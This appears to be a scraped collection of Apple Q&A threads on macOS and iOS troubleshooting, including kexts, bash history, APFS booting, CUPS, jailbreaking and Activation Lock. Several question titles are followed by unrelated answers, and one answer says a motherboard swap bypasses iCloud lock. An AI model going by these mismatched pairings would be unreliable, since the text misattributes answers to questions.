1) you don't use \"Messages in iCloud\" and 2) you don't mind not backing up the entirety of Messages including just the message text themselves.\nThere's no such customization for making the iTunes backups that I know of. I make some software for filtering an existing iTunes backup before restoring, but that won't help with the storage on your hard drive.\n", "Q: Run GUI application in MacOS 10 in Docker I'd like to run an application in a Docker container that can start a GUI.

The following workaround works for windows but neither for tabs nor for split panels:\nfunction exit {\n    osascript -e 'tell application \"iTerm2\" to close first window'\n}\n\nThe solution should work with either zsh or bash. \n\nA: In Terminal, the default setting for handling closed sessions is to leave the window open.\nIn Preferences > Profiles:\n\nIn iTerm2, the default is to close the window\n\nIf you disable that option in iTerm2, it should give you the behavior you're looking for.\n\nA: The section Scripting of the iTerm2 documentation helped me fixing my problem.\nIn .zshrc I defined the following function:\nfunction exit {\n    osascript ~/.zsh/.function_exit.as\n}\n\nWith ~/.zsh/.function_exit.as as\ntell application \"iTerm2\"\n    tell current window to close current session\nend tell\n\nAdditionally I set the following option in the iTerm2 settings:\n\n\nUsing all the above things together I achieve the following behaviour:\n\nSince this does not depend on the Shell used everything should work perfectly using bash (and the corresponding dot-file).\n\nA: in your .profile you could add\nalias killiTerm2='killall iTerm2'\nthe from the terminal, you would just call killiTerm2, and it would kill every running instance of iTerm2\n", "Q: Should I care too much about battery cycles? I bought a MacBook Pro 13 inch 2017 two days ago and it’s been already 4 cycles \nIs it something that I have to care about? \n\nA: It may have been through a handful of cycles in the factory for testing (unless you checked that it was at zero cycles when you unboxed it?). I'd just keep an eye on it over the next couple of weeks and make sure the number doesn't keep increasing too fast.\n\nA: The charge holding capacity on MacBook's battery drops after they have consumed a certain number of cycles.\nFrom the Apple Support document, About Mac notebook batteries:\n\nBatteries are expected to function for a certain number of cycles. This number represents the sum of total and partial discharge cycles throughout the life of the battery.\n\nRefer to the Apple Support document, Determine battery cycle count for Mac notebooks to determine the battery cycle count.\n\nBatteries have a limited amount of charge cycles before they're considered to be consumed.

I got the flashing folder with a question mark on my 2014 MacBook Pro, running High Sierra. Internet Recovery looked like my only option. The recovery version of the OS loaded and I was able to get to Disk Utility. Unfortunately, all I can see is OS X Base System:\n\nThere is only one disk image visible and here is some of the info:\n\n\n*\n\n*Volume name: OS X Base System \n\n*BSD device node: disk0s1 \n\n*Volume capacity: 2.01 GB \n\n*Available space: 721.2 MB \n\n*Bootable: No \n\n*Disk number: 0 \n\n*Partition number: 1 \n\n*Ejectable: Yes \n\n*Parent disks: disk0\n\n\nIt seems, most likely, I have an issue with the SSD or the physical connectors to the SSD. If that is the case, where is this OS X Base System being stored? Is it stored on my SSD somehow or is it using RAM or is there some hidden storage somewhere that I don't know about?\n\nA: The installer creates a RAM drive (a disk container in the systems memory) that can mount like a normal file system.\n\nA: If all you can see is base system than it is likely that your internal SSD is toast and needs to be replaced.\nI am not familiar with exactly what Apple loads on the recovery partition but I would imagine just enough to boot the system and a couple of utilities (disk Utility.app, etc.). If a recovery partition is unavailable everything is downloaded over your network connection.\nAfter you boot into Recovery Mode the entirety of macOS will be downloaded over your network connection. Once you have a bootable sytstem you will need to restore your files/apps from a backup.\nYou could take the Mac into an Apple store or independent Apple repair shop and have them verify that your drive is indeed toast, which you may have to do anyway unless you are handy enough to replace the drive yourself. \nYou could have a look at that procedure at ifixit.com I have no relation or interest in that company, just a happy user.\n\nA: Just in case someone finds it useful, this has just happened to me. Fortunately, I was able to solve it without purchasing an enclosure, or worse, a new SSD. In my case, the behavior described here was intermittent, sometimes I could boot my Mac seamlessly and sometimes not so. What was weird to me is that whenever I was able to boot in Recovery Mode and could see my SSD, every time I ran Disk Utility it didn't find any errors. I figured something could be wrong with the SSD connector (worst case, don't know if that would have needed a motherboard replacement) or the SSD itself could have been damaged, but since every result from Disk Utility said it was alright, I decided to check my device and notice some dirt accumulated on my SSD and nearby. I followed iFixit's guide for replacing the SSD, but only cleaned it and used a can of compressed air to clean the connector. Then, after a reboot, I could finally install Big Sur from Internet Recovery Mode (I had previously deleted and erased any partitions). I'm getting myself some more cleaning supplies to avoid this happening in the near future, but for now I am able to continue my work.

What is the difference between them? I couldn't find anything about their differences online.\n\nA: mount() is actually a system call, that means it's a C function offered by the system library (libSystem) to tell the system to mount a disk drive. It will talk to the operating system kernel and instruct it what to mount, where to mount it, as well as how to mount it.\nThe command line tool mount is just simple binary around this function call. It parses your arguments and then feeds those into the system mount() call, check the result of the operation and print an appropriate error message if it cannot parse your arguments or the mount operation failed for some reason. The presence of that tool is required by the POSIX standard and as macOS is a POSIX compliant system, it has to offer that command.\nThis command is also found on pretty much every UNIX system as well as on every Linux system, as that's how a user with shell access instructs the system to perform a mount call without having to write C code first and compile that code to a binary using a C compiler. Also that way you can perform mount operation from within shell scripts.\ndiskutil is another command provided by Apple for macOS and it's the command line version of the \"Disk Utility\" application. The UI version looks like this:\n\nOf course, this application is also able to mount drives, so it also has a mount function which you can trigger by diskutil mount (in the UI application you select a disk and then either choose the mount icon from the toolbar in the upper right corner or open the context menu and select \"Mount\").\nAs you can see on the man page of diskutil, the mount call has far less options available (readOnly and an optional -mountPoint), which limits the ways how a volume can be mounted but usually the missing options are not required. Further some options are not required as diskutil will automatically figure out the correct settings for you (whereas mount is rather dumb and often requires you to specify additional settings to make it work correctly).\nAlso diskutil allows admin users (and sometimes even normal users) to mount volumes that otherwise require root privileges, that's why you typically have to use sudo with mount but not with diskutil (it won't allow malicious operations to begin with and as you cannot set any dangerous options, nothing can break either). For convenience and security reasons, diskutil will always mount volumes to /Volumes and to a directory named like the disk volume; you can mount a volume elsewhere with the mountPoint option but then you do require root privileges (as that's potentially a dangerous operation).\nFinally mount requires to specify the mount source as disk device (something like /dev/disk1s2) but diskutil also allows you to specify a volume by its UUID (every volume has such a unique ID which looks like this 3717b1fa-e76b-11ec-9b88-7e3148d68d41), and even by volume name (e.g. \"Macintosh HD\"; if multiple volumes have that name, it picks the first one it finds).\nSo unless you have to use mount for some reason (e.g. as you require a certain option) or want to write a portable shell script, you would usually always use diskutil mount on macOS for mounting volumes. It's easier to use, provides better error messages, and won't require you to become root first. Only fall back to mount if whatever you are trying to do is not possible with diskutil.\n", "Q: Is there are a simple tool to organize photo based on date?

I see a list there of three developers, and I don't recognize all of them.

It appears in Disabled Software but not in System Preferences security pane.\n\nI have grepped /L/E and /S/L/E and /Library/StagedExtensions and the only result I find is in /System/Library/Extensions/AppleKextExcludeList.kext/Contents/Info.plist\nkextutil can't find it so where else can I look?:\n# kextutil -b cn.com.bwstor.filesystems.enfs\nCan't find extension with identifier cn.com.bwstor.filesystems.enfs\n\n\nA: I had a similar experience today. I thought it might be of help for you.\n\"System Preferences > Security & Privacy > General\" tab showed me a blocked system software. It mentioned developer 'Jongwoo Choi' which I didn't recognize. What software is this? Where is it installed?\nAfter searching the internet regarding these blocked software extensions they appear to be \"kernel extensions\" or .kext files.\nSome more searching taught me this:\n\n\n*\n\n*\"System Information > Software > Extensions\" shows all the extensions installed on your machine. Give it some time to load, the list might be long.\n\n*Now, too find the blocked extension by this developer, I ordered the list by \"Obtained from\". If you have an extension name, you can order by \"Extension name\" column. Most of the extensions are obtained from Apple so I guess these can be skipped. Also those with \"Loaded\" value \"yes\" can be skipped as well since the software is blocked from loading. I then checked each item from \"Identified Developer\" or \"Not Signed\".\n\n*You now should be able to find the developer or company name (that was mentioned in the \"System Preferences > Security & Privacy > General\" tab list of blocked software) in the details you get for each item in the window below the extensions list. Check the value for \"Signed By\". For me there was only one entry for that specific developer.\n\n*Once you found it, the value for \"Location\" will show you where the .kext file is located. The value for \"Bundle ID\" might also help to explain what this is about.\n\n\nSince the kernel extensions wasn't loaded I decided to remove it.\nsudo rm -rf path/to/the/kext/file\n\nI then rebooted (not sure if it is needed).\n\"System Preferences > Security & Privacy > General\" didn't show me the blocked software message. Hooray!\nHowever, \"System Information > Software > Disabled Software\" DID still show me one entry of disabled software. I recognised the entry title from the detailed information in the extension list earlier on. It is the one I just removed. For me this was \"F3YNT8UCP3 - net.sf.tuntaposx.tap\"\nWhy is it still there while I removed the .kext file? As Elliott mentioned in a comment above, it seems that there is a SQLite db that tracks information about the approval of installed software. Deleting the .kext file does not remove the entry from the database.\nHow to remove the entry from the db to remove it from the \"System Information > Software > Disabled Software\" list is described in here on Stack Overflow. The first part of the disabled software entry is the Team ID (F3YNT8UCP3 in my case). You'll need this ID to specify which entry to delete from the SQLite db.\nSo removing the .kext file should remove the warning in \"System Preferences > Security & Privacy > General\". Removing the item from the SQLite db should remove the disabled software entry in \"System Information > Software > Disabled Software\".\n\nA: Adding to your own answer, Elliott, you can then feed this bundle ID to kextutil:\nsudo kextutil -b \"com.hp.kext.hp-fax-io\"\n\nWhich will then tell all you ever wanted to know about it including the location of the .kext file:\nfile:///Library/StagedExtensions/System/Library/Extensions/hp_fax_io.kext/ is in hash exception list, allowing to load\nKext rejected due to system policy: <OSKext 0x7fe302c19730 [0x7fffa5fc38f0]> { URL = \"file:///Library/StagedExtensions/System/Library/Extensions/hp_fax_io.kext/\", ID = \"com.hp.kext.hp-fax-io\" }\nCode Signing Failure: not code signed\nWarnings:\n    Personality CFBundleIdentifier differs from containing kext's (not necessarily a mistake, but rarely done):\n        HPF00072 FAX - 2\n        HPF00006 FAX - 2\n[…]\n\nAlso it seems you can generally find all those extensions in that directory:\n$ ls -la /Library/StagedExtensions/System/Library/Extensions\ndrwxr-xr-x@ - root 14 Feb  2013 hp_fax_io.kext\ndrwxr-xr-x@ - root 19 Aug  2013 hp_Inkjet1_io_enabler.kext\ndrwxr-xr-x@ - root 19 Aug  2013 hp_Inkjet9_io_enabler.kext\ndrwxr-xr-x@ - root 31 Okt  2014 intelhaxm.kext\ndrwxr-xr-x@ - root 22 Mai  2012 JMicronATA.kext\ndrwxr-xr-x@ - root 16 Aug  2012 Pen Tablet.kext\ndrwxr-xr-x@ - root 23 Jul  2016 SiLabsUSBDriver64.kext\ndrwxr-xr-x@ - root 23 Jul  2016 Wacom Tablet.kext\n\n\nA: I figured it out.  In System Information > Software > Disabled Software, it shows a list of these extensions with their bundle identifier.  In my case, that was enough info to understand what the app is, but to locate the actual kext file requires more digging.  Example:\ngrep -r \"com.aladdin.kext.aksfridge\" /Library/Extensions finds nothing.\ngrep -r \"com.aladdin.kext.aksfridge\" /Library/Application Support found it.\nI'm not sure if there is a documented list of locations that are allowed to load kexts, but you could grep the whole hard drive for the bundle ID and that would surely find it.\n\nA: I don’t have a complete answer, but there are amazing reverse engineering efforts and information sharing that might get you the final piece or a foothold enough to roll your own. \nRichard Purves has done amazing work to cover “kextpocalypse” and scripting and most major MDM vendors have specific examples how to push white lists and deal with this user approved kernel extensions. \nAlso, be aware the behavior isn’t fully set as Apple is refining and changing how this works each release (lately) so YMMV more than usual. \n\n\n*\n\n*https://www.richard-purves.com/2017/11/12/kextpocalyse-2-the-remediation/\nMichael Lynn also is way above and beyond what I’d expect from a paid consultant putting out powerful scripts and documenting them expertly. \n\n\n*\n\n*Querying active SIP status directly from the kernel, bypassing nvram and csrutil, via python on macOS\n\nA: I came to this discussion while trying to validate kexts migrated from 10.13 to 10.15 which weren't loading. I seem to have found an explanation and a workaround.\nThe kexts were valid for 10.15 but hadn't been installed under 10.15, as they arrived with a system migration. I assume the same problem would occur with an OS upgrade. (It goes without saying that I'm deeply disappointed in Apple for not foreseeing this eventuality.)\nI came across the following advice regarding installing SATSMART drivers in the FAQ on binaryfruit.com which has some relevance to the question:\n\nHow to rebuild macOS kernel extensions/driver cache\nWhen the macOS boots – it saves all currently used kernel extensions (drivers) into a cache for faster booting next time – and if you move\nthings around in “/Library/Extensions/” and\n“/System/Library/Extensions/” – you won’t see those changes reflected\nuntil the caches are rebuilt. Also, due to bugs in some versions of\nmacOS – kext cache becomes outdated or corrupted, especially in the\ncase of system upgrades. Manual kext cache rebuild could fix many\ntroubles with drivers (kernel extensions).\nType in the terminal following commands: sudo kextcache -i /\nsudo kextcache -system-caches\n\nThe first command brings up a complete list of kexts that were not loading for a number of reasons - including (but not limited to) Kext rejected due to system policy meaning permission had not been granted in Security & Privacy - along with their locations.\nIn my experience, kexts blocked for reasons other than needing user approval show up here, even if they don't appear amongst Disabled Software.\nAddressing the OPs original question more specifically regarding knowing who the kext developers are, since this may not directly correspond to the software branding, these can be parsed from package inspector apps such as Pacifist and then compared with the kext names output by the terminal command above.\nMy personal preference is to open an installer package in Suspicious Package, where the developer and their 10 character alphanumeric TeamID are easily readable. For kexts simply awaiting user approval this does, of course, correspond with the TeamID found in Disabled Software, as explained by the OP above.

I can't really find a difference with/without it (history from closed shells still show up in history in a new shell). \n\nA: shell_session_history_check calls shell_session_history_enable which creates a unique log file for each shell session.\nNOTE: shell_session_history_check is a Mac specific function.\n\nLet's break it down.\n$ declare -f shell_session_history_check\nshell_session_history_check () \n{ \n    if [ ${SHELL_SESSION_DID_HISTORY_CHECK:-0} -eq 0 ]; then\n        SHELL_SESSION_DID_HISTORY_CHECK=1;\n        if shell_session_history_allowed; then\n            shell_session_history_enable;\n        fi;\n        if [ \"$PROMPT_COMMAND\" = \"shell_session_history_check\" ]; then\n            unset PROMPT_COMMAND;\n        else\n            if [[ $PROMPT_COMMAND =~ (.*)(; *shell_session_history_check *| *shell_session_history_check *; *)(.*) ]]; then\n                PROMPT_COMMAND=\"${BASH_REMATCH[1]}${BASH_REMATCH[3]}\";\n            fi;\n        fi;\n    fi\n}\n\nThe last if/else removes shell_session_history_check from the PROMPT_COMMAND (assuming your PROMPT_COMMAND starts with shell_session_history_check;) so that it only runs on the first prompt.\nshell_session_history_allowed is true by default so basically the real behavior is calling shell_session_history_enable.\n$ declare -f shell_session_history_enable\nshell_session_history_enable () \n{ \n    ( umask 077;\n    /usr/bin/touch \"$SHELL_SESSION_HISTFILE_NEW\" );\n    HISTFILE=\"$SHELL_SESSION_HISTFILE_NEW\";\n    SHELL_SESSION_HISTORY=1\n}\n\nThis function overwrites the default value of HISTFILE (~/.bash_history) and sets the SHELL_SESSION_HISTORY to 1 (true).\nSo this question boils down to: Why is the history saved even though HISTFILE isn't set to a unique file name?\nWell it still functions the same way. Once the shell exits, it appends to ~/.bash_history. The difference is that you don't have unique files logging each session.\nWhy would I want unique files logging each session?\nCheck out this Reddit post:\n\n(~/.bash_sessions/) is used to store HISTFILE's and .session files\nthat are unique to sessions. If $BASH_SESSION or $TERM_SESSION_ID is\nset upon launching the shell (i.e. if Terminal is resuming from a\nsaved state), the associated HISTFILE is merged into the current one,\nand the .session file is ran. Session saving is facilitated by means\nof an EXIT trap being set for a function bash_update_session_state.\nEssentially, this lays the groundwork for us to be able to extend\nTerminal's session-resuming using our own rc files. By implementing\nour own extension of bash_update_session_state, we can, say, add\nfunctionality to the .session files that are run upon resume.\n\n", "Q: Why is arp -a showing so many incomplete addresses?

Now only the power button works (MBA 2012). During the process, the screwdriver pierced through some of the plastic \"button\" (which in itself shouldn't be a problem I guess), and the sharp head (not always dry) touched the underlying board (which is not the motherboard) from time to time as well.\nNow I'm planning to replace the broken part on my own, and found out two options. Either the keyboard alone, which isn't officially supported but cheaper, or the complete upper case. For the first option I'd need to make sure that it's really just the keyboard that's broken. Could anyone tell me roughly how likely it is the case from my description?\nThanks in advance.\n\nA: At this point, you know you have a keyboard that's much easier to work on than the new butterfly design and an excellent / detailed explanation how that keyboard works.\n\n\n*\n\n*Keyboard key stuck or not being recognized; how to fix\nAlso, you have an appreciation that doing this removal of a key has a very non-zero chance of breaking things. At this point you have a resource dilemma.\n\n\n*\n\n*How much is your time worth?\n\n*How many parts and training do you need to successfully re-assemble the physical case?\n\n\nIf you want to fix it yourself, you can test all the keys physically by making sure the nubbin presses. If that's broken - you need a new top case or you need to consider using a bluetooth keyboard (if you must be portable) or a USB keyboard if low cost and low mobility is best.\nNext cheapest is trying the top case repair, but you run the risk of under-estimating the tools and training needed there and could also break more than just the keyboard if you attempt a top case transplant of the computer (you're moving all the parts of the computer to a new frame, basically).\nAlso - consider getting a quote. Apple might charge $300 to repair everything you messed up and everything wrong with the computer functionally and put a 90 day warranty on all the parts touched in the repair. You're basically buying the best used Mac verified by Apple and you know the previous owner. I don't know many people that would turn down that good a deal if they needed a new computer, so don't look back about how cheap this could have been if the repair had only worked. It didn't (for reasons) and you're now faced with what next now that you know DIY repairs might have more risks than apparent at first. (Also don't undervalue your experience and knowledge you gained in this.

In fact, one of the troubleshooting steps is to disable cellular network which makes me think it uses local network discovery and intentionally doesn’t want your data going anywhere except from one Android device to one iOS device. (That also follows Apple’s long time design to never send data out when you can keep it local.) \nIf you have closed WiFi, use that and you don’t need the Mac. The only case I see needing Mac in this scenario is if you want to use the WiFi hardware to make a local network for both mobile devices to talk to each other. \n\nA: Apple's 'Move to iOS' app requires WLAN connection between Android and iOS devices, so there should be no issues with the transfer in your scenario as I understand.

I split the disk into two partitions, mirrored the OS and updated it on one partition to macOS 10.13. After the update I changed the startup disk and rebooted 10.10, changed the startup disk again and rebooted 10.13. Worked like a charm.\nFor debugging purposes, I booted 10.10 again today. However, I'm not able to select the 10.13 partition as a startup disk. I guess this is due to the \"on the fly\" migration from HFS+ to APFS, which wasn't finished when I tried booting from 10.10 immediately after the update. Now that it is finished, 10.10 doesn't understand the content of the APFS partition anymore, thus I can't select it as a startup disk in system preferences.\nThe Mac Pro is located in a data center, and I don't have physical access. So I can't hold any keys while booting. Hence, to change the boot device, I tried bless. Therefore I need the partition or device.

Missing an argument? Or is there any other way of setting the boot device so that the machine starts with 10.13 again?\n\nA: I believe you are S.O.L. here. Due to the haphazard way Apple has introduced APFS and instantly made it the default filesystem for 10.13 all at once, the only way to do what you are trying to do is to boot holding the option key. 10.12 and older won't let you choose your 10.13 volume because those OSes can't read APFS. \nApple has has many similar introductions in the past, but they did them right. They introduced support for something, then a few OS versions later THEN they make it default. APFS was released instantly, with with no support at all from third party apps, no support even from 10.12. Its a true clusterfuck and I suggest people wait an OS version or two before they switch to it. 10.13 runs just fine on an HFS+ volume. \n", "Q: Mac Mini powerful enough to play any 1080p movie?

I have both a USB hub that has a flash USB and an external USB drive. A family member often pulls it out without ejecting, and I'm trying to ease the effects of that.

It's not foolproof, but better than nothing.\nDoes anyone have a good overall solution to this problem--and more specifically, can someone tell me if the drives are ejected upon logout?\n\nA: This answer assumes by logoff/logout you're meaning the Log Out option under Apple > Log Out and not shutting down your Mac.\nBy default the behaviour of macOS High Sierra is to unmount all volumes except for the boot volume. \nHowever, if more than one user is logged in, then all volumes remain  mounted so that they're still available to the other users.\nNOTE: The above behaviour is the same regardless of any network file sharing that is active. That is, if a user is connected to your Mac via file sharing (e.g. SMB etc) this does not change the default behaviour above. They would still be able to access the boot volume of your Mac (even if you're logged out) but they will no longer be able to access other volumes.\n\nShutting down\n[This edit explains what happens if you shut down your Mac instead of logging out]\nIn all situations of a normal1 Mac shutdown any mounted drives will be unmounted/ejected and no longer available (assuming those drives are connected to that Mac in the first place).\nThis means that any:\n\n\n*\n\n*internal drives (SSD or HDD) will be unmounted upon a shutdown\n\n*external drives connected directly to the Mac via USB/Firewire/Thunderbolt etc will be unmounted/ejected upon a shutdown\n\n*external drives connected directly to the Mac via a hub (e.g. a USB hub) will be unmounted/ejected upon a shutdown\n\n*external drives not connected directly to the Mac (i.e. they're being shared on a network by another device) will be unmounted from that Mac upon shutdown but are still available on the network to other devices that also access those volumes.\n\n\nIt's important to note, however, that just because a volume is unmounted/ejected doesn't necessarily mean that it's powered down. If the volume is USB powered (i.e. it is powered by its USB connection, not by another power source) then it will be powered off upon a shutdown. However, if it has its own power supply and/or is connected via a powered hub, the drive may remain powered up. If this is the case it still isn't accessible and also shouldn't pose any problems  - but nevertheless it's an important distinction to make.\n1. By a 'normal' shutdown I mean you have shut down the computer normally (e.g. Apple > Shut Down) and not because of a power failure or forced shutdown. In the case of a power failure or forced shutdown any  mounted drive will still be unavailable (unless it's a network drive shared by another device) but it won't have gone through the proper unmount/eject procedure. In these instances it is possible for data loss or corruption, and in very rare cases for damage to the physical drive itself.\n", "Q: this mac can't connect to icloud because of a problem with gmail Every time I boot up I get the following error message on my mac mini:\nThis mac can't connect to icloud because of a problem with gmail\nOpen iClould preferences to fix this problem.\nEach time I enter my password, but it comes again next boot.\nI have read that others have had this issue, and the solution was to log out of icloud, and then log back in.

(For the record, I told them I'd swing buy and unlock it myself.)\nThis situation doesn't make sense to me because everything I've read suggests that it should be possible for a savvy user to erase data on a phone even if they don't know the lock code, and furthermore, I would have just naturally assume that a brick-and-mortar smart phone store would have the capability to erase a phone that had a lock code on it.  \nDoes their ask make sense?  Would a sprint store need a lock code to erase the data on a phone?\n\nA: It is not necessary to be in possession of the lock code to erase the iPhone, since a DFU restore can be performed at any time (until iOS 12 restricts USB access after 1 hour since last unlock).\nActivation Lock will remain if the device is still in your iCloud account's Find My iPhone, but it seems you've already removed it otherwise you could use the Erase iPhone feature remotely.\n", "Q: I did not make this purcase I received an email yesterday that said APP Store Receipt.\nDiamond Mobile Legends  Price $100     (5000 Diamonds)\nI did not make this purchase.\nPlease cancel this or contact me for next step.\n\nA: We are not Apple, please see https://www.apple.com/contact/ for ways to contact Apple directly.\nBefore you do so, log into iTunes and check the purchase history there.

I use different desktops as project spaces.  This generally works great and feels organized.  I can work on multiple concurrent projects and context-switch at will when I want to resume work on a different project.  However, there's one problem when it comes to the downloads folder...\nIf I reveal a downloaded item (using Safari's downloads button and the magnifying glass icon next to a download), and then at some point switch desktops/projects, download a new file, and do the same thing to reveal the new item's location in the Finder, the Finder gets focus, but the front-most Finder window is whatever happened to already be opened on that desktop - not the downloads folder.  If there's no Finder window already open, the desktop gets focus.  That's because the downloads folder is already open on a different desktop.  I am forced to search through my desktops to find the already-opened downloads folder and either move it to the desktop I'm working on or close it, go back, and re-open it from Safari.  I suppose I can select the downloads folder from the Finder's Window menu, but I'd rather not have to switch desktops to get to the file I want.  Ideally, the downloads button/menu in Safari would just behave as expected.\nCan anyone think of a way to get Safari's downloads button to always reveal an item's location and force it to open a new finder window if the current desktop doesn't have one already (but another one does)?  Can I force Safari to always open a new Finder window to the downloads folder?  Can I create my own downloads button in the Safari toolbar that does what I want?  Is there some good folder action to automatically close the downloads folder when some clever thing happens?  Is there a way to assign JUST the downloads Finder window to all desktops?  It seems silly that this isn't already handled intuitively by Apple.\n\nA: I just tried to recreate your issue, and with multiple desktops, some with already-open Finder windows, when I click Show in Finder on Safari, which is on a desktop without any Finder windows, I get the file location shown in a new Finder window on the same desktop as Safari. I tried to mess it up but I couldn't.\nOne thing you might want to try, is on the Dock, right click Finder, under Options choose \"None\" under Assign To. Both Safari and Finder had this option selected when I was retracing your steps.\nSince this is a half-baked \"answer\", I wanted to make this into a comment however I currently lack the rep required.\n", "Q: 11.4 Full Jaillbreak method Yet? I've been searching around for a a while now and So far I haven't found any full jailbreaks for ios 11.4 on a 6s. To be honest, I am new to the jailbreaking scene. I've installed Velonzy, but could find no jailbreaking tools. Am I missing something, or is there truly nothing left.\nPS. I would downgrade to a system-rootable version but I haven't any SHSH blobs, or found any alternative method. Is it possible?\n\nA: Nothing for 11.4 has been announced. Very rarely is a currently-signed iOS version jailbreakable.\nSave your blobs for every signed version of iOS you can while it's still being signed, and stick on the lowest version of iOS is the recommended advice if you hope to jailbreak.\nJust be aware that failure to update to the latest version of iOS may result in your device being less than secure as it could be. Often it's the insecurities that are leveraged into a jailbreak, so the choice is up to you.\n", "Q: Can changing iPad motherboard to older version bypass iCloud lock? I was curious to know if its possible to change the motherboard of an iPad to reset its software version? The iPad is locked to my friends late grandpa, and hence locked to his name. \nI was using it without any problems until one fine day when the iOS upgraded from 6.0 to 7.0 and after that it was asking the iCloud password of the device, which unfortunately none of us knows. Then I kept the iPad as a decoration, until today, when it struck me, that probably changing the motherboard might help to reset the software version to an earlier iOS version.\nOr are there any other possible technical solution to bring back the iPad to life, instead of running around solicitors and lawyers? \nThis is a genuinely bought family iPad / not stolen etc duly passed on to a family member.\n\nA: For most intents and purposes, the motherboard is the iPad. The rest of it is just parts which surround the motherboard -- case, battery, screen, etc.\nAll of the device's storage is on the motherboard -- placing a new motherboard into the shell of another iPad will not give you access to data which was stored on the old iPad, because the storage was all on the motherboard you removed.\nIf your goal is simply to have a working device, you can continue, of course. But if you want to get access to the data you had on the old iPad, you'll want to look into other solutions.\n\nA: Just because you can do it does not mean that you should.\nCan you bypass iCloud lock by installing a clean motherboard? yes.\nShould you do it? no. It will probably be the same price, maybe cheaper, to buy another ipad and you will not have the risk of messing something up during installation.\n\nA: \nI have heard that if you can provide an official certificate of death, to Apple they will reset passwords of systems/accounts belonging to the deceased. That said a third party repair shop will likely be able to do this for you. \n\n–From comment by Steve Chambers\n", "Q: How to combine \"Choose folder command\" with \"adding folder items\" function with Applescript I'm using a folder action to create a \"hot\" folder, which immediately duplicates the files placed in this folder to a specific backup folder.\nThis is the script I'm using as folder action and it works fine:\non adding folder items to this_folder after receiving these_items\n   tell application \"Finder\" to duplicate these_items to folder \n   (\"Macintosh HD:Users:photograper:Desktop:Target:\")\nend adding folder items to\n\nBut I want to run this folder action like a normal applescript and trigger the \"adding folder items\" function  with a \"Choose folder\" command.

Most of it is kept \"offline\" but the library software I use (Plex) uses media files to build the library and so I need to use placeholder files.\nUsing 30 second \"this file is archived\" videos I can easily catalog offline movies in Plex. I \"rsync\" the directory structure without files and then \"do cp\" a placeholder into each movie directory and rename using the parent folder name.\nFor TV shows this isn't practical as there can be hundreds of episodes per show. I would like to know if there is a way to duplicate the folder/file structure of a tv show, with many episodes under a single folder, using the same placeholder file.\nI think there is a way to create folders from the filenames, then copy the placeholder into each new folder, rename using the folder name and then move the files back out to a single directory, but I don't know how.\n\nA: Here is what I would do (there may be more efficient ways to automate this, but this is a quick hack that should achieve what you need). I hope I've understood your question correctly.\nTo get a list of all the directories (and their subdirectories) within an existing directory:\nOpen Terminal, and navigate to the existing folder containing the structure you would like to duplicate (if you are not familiar with Terminal, I am happy to give more specific guidance on how to do this. Basically, if you think of Terminal like Finder, the default folder that you are \"viewing\" when you open Terminal is your user folder. From there, you can type pwd to see where you are, ls to see a list of everything in the current directory, cd [folder name] to move into a folder in the directory, and then cd .. to move back up a level to the parent directory).\nType the following command:\nfind . -type d\n\nThis will list all of the directories contained in the current directory, as well as each of their subdirectories (i.e. it will not stop searching until there are no more subdirectories to enter).\nThe list will have entries that look something like this:\n./directory1\n./directory1/subdirectory1\n./directory2\n./directory2/sub2/sub3/sub4\n\nWe need to clean the formatting up just a bit before we can use this text.\nTo clean up the text so it can be used to recreate that folder structure:\nCopy this list into any plain text editor (not Microsoft Word); I use TextWrangler but TextEdit comes with your computer. Using the find and replace feature, remove every instance of ./ (leave the \"replace with\" box empty and press replace all). This will delete all the initial periods and slashes, but retain subsequent slashes which indicate subdirectories.\nAlso, delete all new lines (i.e. the text may wrap onto multiple lines, but there should be no explicit new paragraphs in there). The above example will now look like:\ndirectory1 directory1/subdirectory1 directory2 directory2/sub2/sub3/sub4\n\nTo create an arbitrary number of new folders with one command:\nNote: You could also do this step using folder names from a different source, I was slightly confused by what the source of the folder names was in your question\nYou should now have a list of folder/subfolders that is all on one line (though it may wrap to multiple lines when it is rendered in your text editor), and has no punctuation*. Copy all of this text to your clipboard. Go back to Terminal, and use cd [folder], cd .., ls and pwd to navigate to the destination folder where you want to recreate the folder structure, as described above.\nOnce you are in the right folder, type:\nmkdir -p and then commandv, and hit enter. Make sure there is a space (and nothing else) between mkdir -p and the first directory name, and one space between each subsequent directory name.\nI know people have varying levels of familiarity with UNIX and the Terminal environment, so if this is confusing feel free to comment which steps need more clarification.\n*Note that if any of the directory names you paste into Terminal have spaces or non alphanumeric characters such as (./'!?:_) etc., you need to escape them or it will not work. That is, for every space or other weird character, you must put a \\ directly before it (note the difference between \\ and /). So music/the beatles becomes music/the\\ beatles. You can use find and replace for this as well.\n", "Q: Can no longer log into CUPS web admin on macOS Mojave Beta? I have a printer and I'm trying to set the default paper size. Normally, I can do this via the cups webadmin localhost:631 \nIf you make any changes to a printer, it asks for your login credentials via an http basic auth request. On previous versions of Mac OS/OS X, you would use your 'short name' login and password for that computer. My Macbook Air is running the latest Mojave release 10.14 beta and now that no longer works. It asks for the password, but rejects it. I am sure the short name/password i am using is correct, as that's the one you need for all the auth system changes. \nHas anyone else had this problem? Does anyone know how to log in to the CUPS webadmin to make changes to a printer's default settings?\n\nA: I had to enable the cups webinterface first: \nOpen a terminal and type: \nsudo cupsctl WebInterface=yes\n\nConfirm with <enter> and enter your password. \nThen authentication as described worked fine (on the final Mojave, though, not the beta)\n\nA: Unfortunately CUPS seems to not be available.

In iOS 8 Apple released a time-lapse feature for the camera app. It seems as though time-lapses are recorded in 1080p. I would like the time-lapse to be recorded instead in 4K. Is this possible?\n\nA: No, the default camera app does not record time lapse in 4K unfortunately. I believe that there are third-party apps that will work. Alternatively you can just record a 4K video (set it to the lowest frame rate in settings) and then speed it up in iMovie on your phone.

